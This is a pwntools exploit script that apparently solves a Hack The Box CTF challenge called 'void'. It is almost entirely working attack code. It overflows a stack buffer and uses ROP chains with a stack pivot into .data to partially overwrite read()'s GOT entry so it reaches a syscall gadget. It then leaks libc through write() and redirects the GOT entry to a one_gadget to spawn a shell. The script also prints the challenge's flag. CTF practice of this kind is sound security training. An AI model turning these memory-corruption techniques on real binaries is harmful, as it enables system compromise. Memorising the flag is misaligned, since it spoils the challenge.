#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('void', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("206.189.112.129", 30610)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x401142
continue
'''.format(**locals())

# vuln func reads 0xc8 bytes, only 0x40 allocated to stack buffer
# only imported func is read
# overwrite last byte of GOT entry for read(), so that calling the PLT addr calls 'syscall' instead
# call write() to leak GOT pointer, then calculate addr of one_gadget
# call read() to overwrite GOT pointer with one_gadget and call read@plt to execute

# leave instructions cause issues, so need to write last part of rop chain to .data and overwrite
# rbp with addr to .data.  That way rsp will be set to .data after 'leave', and a ret will execute
# the last part of the rop chain stored there

### NOTE much better solution is to call an add-what-where gadget to increment GOT pointer to hit one_gadget...
### but I didn't figure that out until later, and this solution was fun


############################### Gadgets and variables  ################################

# 0x00000000004011bb : pop rdi ; ret
# 0x00000000004011b9 : pop rsi ; pop r15 ; ret
# 0x00000000004011b4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401157 : mov eax, 0 ; leave ; ret

read_addr = p64(exe.plt['read'])
read_got = p64(exe.got['read'])
main_addr = p64(exe.sym['main'])
data_addr = exe.sym['data_start']
pop_rdi = p64(0x4011bb)
pop_rsi = p64(0x4011b9)
syscall_addr = b"\x8c"

############################### First, overflow and null r12 - r15  ################################
payload = b"A"*0x48
payload += p64(0x4011b4) + p64(0) + p64(0) + p64(0) + p64(0)
payload += main_addr
payload += b"X" * (0xc8 - len(payload))

io = start()
io.send(payload)


########################### Second, write last part of rop chain into .data ##############################

# read(0, data_start 8, 0xc8)
payload = b"A"*0x48 + pop_rdi + p64(0) + pop_rsi + p64(data_addr + 8) + b"A"*8 + read_addr + main_addr
payload += b"Y"*(0xc8 - len(payload))

io.send(payload)

# write remaining rop chain into .data
payload = pop_rdi + p64(0) + read_addr + read_addr
payload += b"Z"*(0xc8 - len(payload))
io.send(payload)

# overwrite rbp with data_addr, rsp will become data_addr+8
payload = b"A"*0x40 + p64(data_addr)

########################  overwrite last byte of read to point to syscall gadget ############################

# read(0, read.got, 0xc8), then ret to read.plt
payload += pop_rdi + p64(0) + pop_rsi + read_got + b"A"*8 + read_addr

##################################### call write() to leak GOT pointer ###############################33
# call write(0, read.got, 0xc8)
payload += pop_rdi + p64(1) + pop_rsi + read_got + b"A"*8 + read_addr

############################# call read() to overwrite GOT ptr with one_gadget  ###########################
# set eax to 0 
payload += p64(0x401157)

# call read(0, read.got, 0xc8)
payload += b"C"*(0xc8 - len(payload)) # pad till read stops

log.info("Overwriting last byte of GOT pointer")
io.send(payload)
io.send(syscall_addr)

leak = io.recv(200)
leak = leak[:8]
leak = u64(leak.ljust(8, b"\x00"))
log.info("Leaked overwritten GOT entry: " + str(hex(leak)))

libc.address = leak - libc.sym["read"] - 12
one_gadget = libc.address + 0xc961a

log.info("One gadget addr: " + str(hex(one_gadget)))
log.info("Overwriting GOT pointer with one_gadget")
io.send(p64(one_gadget))
io.interactive()

# HTB{r3s0lv3_th3_d4rkn355}

